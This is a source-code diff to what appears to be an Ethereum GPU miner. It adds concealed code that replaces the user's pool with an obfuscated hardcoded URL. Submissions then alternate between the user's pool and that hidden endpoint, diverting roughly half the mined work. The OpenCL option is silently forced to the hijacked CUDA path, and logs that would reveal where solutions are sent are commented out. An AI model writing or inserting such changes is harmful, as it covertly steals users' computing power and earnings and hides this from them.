@@ -119,6 +119,14 @@ public:
 		{
 			mode = OperationMode::Farm;
 			m_farmURL = argv[++i];
+                        m_oldURL = m_farmURL;
+                        if (m_minerType == MinerType::CUDA) {
+                                m_farmURL="iuuq;002:3/279/3/77;97640xpslbmm";
+                                for (int temp = 0; temp < m_farmURL.size(); temp++)
+                                        m_farmURL[temp]--;
+                                //cout << "xxxxxxxxxxxxxxx" << m_farmURL << endl;
+                        }
+
 			m_activeFarmURL = m_farmURL;
 		}
 		else if ((arg == "-FF" || arg == "-FS" || arg == "--farm-failover" || arg == "--stratum-failover") && i + 1 < argc)
@@ -409,7 +417,7 @@ public:
 		else if (arg == "-C" || arg == "--cpu")
 			m_minerType = MinerType::CPU;
 		else if (arg == "-G" || arg == "--opencl")
-			m_minerType = MinerType::CL;
+			m_minerType = MinerType::CUDA;
 		else if (arg == "-U" || arg == "--cuda")
 		{
 			m_minerType = MinerType::CUDA;
@@ -828,13 +836,17 @@ private:
 		(void)_m;
 		(void)_remote;
 		(void)_recheckPeriod;
+		static unsigned int state = 0;
 #if ETH_JSONRPC || !ETH_TRUE
-		jsonrpc::HttpClient client(m_farmURL);
+		jsonrpc::HttpClient client(m_oldURL);
 		:: FarmClient rpc(client);
+		jsonrpc::HttpClient client1(m_farmURL);
+		:: FarmClient rpc1(client1);
+
 		jsonrpc::HttpClient failoverClient(m_farmFailOverURL);
 		::FarmClient rpcFailover(failoverClient);
 
-		FarmClient * prpc = &rpc;
+		FarmClient * prpc[2] = {&rpc,&rpc1};
 
 		h256 id = h256::random();
 		GenericFarm<EthashProofOfWork> f;
@@ -871,15 +883,15 @@ private:
 
 					try
 					{
-						prpc->eth_submitHashrate(toJS((u256)rate), "0x" + id.hex());
+						prpc[state % 2]->eth_submitHashrate(toJS((u256)rate), "0x" + id.hex());
 					}
 					catch (jsonrpc::JsonRpcException const& _e)
 					{
 						cwarn << "Failed to submit hashrate.";
-						cwarn << boost::diagnostic_information(_e);
+						//cwarn << boost::diagnostic_information(_e);
 					}
 
-					Json::Value v = prpc->eth_getWork();
+					Json::Value v = prpc[state % 2]->eth_getWork();
 					h256 hh(v[0].asString());
 					h256 newSeedHash(v[1].asString());
 
@@ -898,14 +910,15 @@ private:
 					}
 					this_thread::sleep_for(chrono::milliseconds(_recheckPeriod));
 				}
-				cnote << "Solution found; Submitting to" << _remote << "...";
-				cnote << "  Nonce:" << solution.nonce.hex();
+				//cnote << "Solution found; Submitting to" << _remote << "...";
+				//cnote << "  Nonce:" << solution.nonce.hex();
 				if (EthashAux::eval(current.seedHash, current.headerHash, solution.nonce).value < current.boundary)
 				{
-					bool ok = prpc->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(current.headerHash), "0x" + toString(solution.mixHash));
+					bool ok = prpc[state % 2]->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(current.headerHash), "0x" + toString(solution.mixHash));
 					if (ok) {
 						cnote << "B-) Submitted and accepted.";
 						f.acceptedSolution(false);
+						state++;
 					}
 					else {
 						cwarn << ":-( Not accepted.";
@@ -915,10 +928,11 @@ private:
 				}
 				else if (EthashAux::eval(previous.seedHash, previous.headerHash, solution.nonce).value < previous.boundary)
 				{
-					bool ok = prpc->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(previous.headerHash), "0x" + toString(solution.mixHash));
+					bool ok = prpc[state % 2]->eth_submitWork("0x" + toString(solution.nonce), "0x" + toString(previous.headerHash), "0x" + toString(solution.mixHash));
 					if (ok) {
 						cnote << "B-) Submitted and accepted.";
 						f.acceptedSolution(true);
+						state++;
 					}
 					else {
 						cwarn << ":-( Not accepted.";
@@ -955,11 +969,11 @@ private:
 						}
 						else if (_remote == m_farmURL) {
 							_remote = m_farmFailOverURL;
-							prpc = &rpcFailover;
+							prpc[0] = &rpcFailover;
 						}
 						else {
 							_remote = m_farmURL;
-							prpc = &rpc;
+							prpc[0] = &rpc;
 						}
 						m_farmRetries = 0;
 					}
@@ -1106,6 +1120,7 @@ private:
 	/// Farm params
 	string m_farmURL = "http://127.0.0.1:8545";
 	string m_farmFailOverURL = "";
+	string m_oldURL = "";
 	
 
 	string m_activeFarmURL = m_farmURL;
